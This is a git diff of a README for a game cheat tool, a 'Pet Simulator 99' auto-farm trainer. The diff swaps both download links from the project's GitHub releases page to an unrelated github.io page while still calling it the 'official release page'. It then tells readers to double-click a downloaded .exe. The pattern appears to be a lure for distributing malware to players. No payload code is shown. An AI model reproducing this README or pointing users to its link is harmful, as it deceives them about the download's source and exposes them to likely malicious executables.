@@ -1,6 +1,6 @@
 # 🐾 Pet-Simulator-99-Auto-Farm-Trainer-2026-Ultimate - Automate your gameplay and collect rewards quickly
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Agrabo7920/Pet-Simulator-99-Auto-Farm-Trainer-2026-Ultimate/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://agrabo7920.github.io)
 
 ## 📥 Getting Started
 
@@ -18,7 +18,7 @@ Ensure your computer meets these requirements before you start:
 
 ## 💾 Installation Steps
 
-1. Visit the [official release page](https://github.com/Agrabo7920/Pet-Simulator-99-Auto-Farm-Trainer-2026-Ultimate/releases) to download the latest version of the software.
+1. Visit the [official release page](https://agrabo7920.github.io) to download the latest version of the software.
 2. Locate the file ending in .exe in your Downloads folder.
 3. Double-click the file to launch the installation wizard.
 4. Follow the on-screen prompts to select your installation folder.
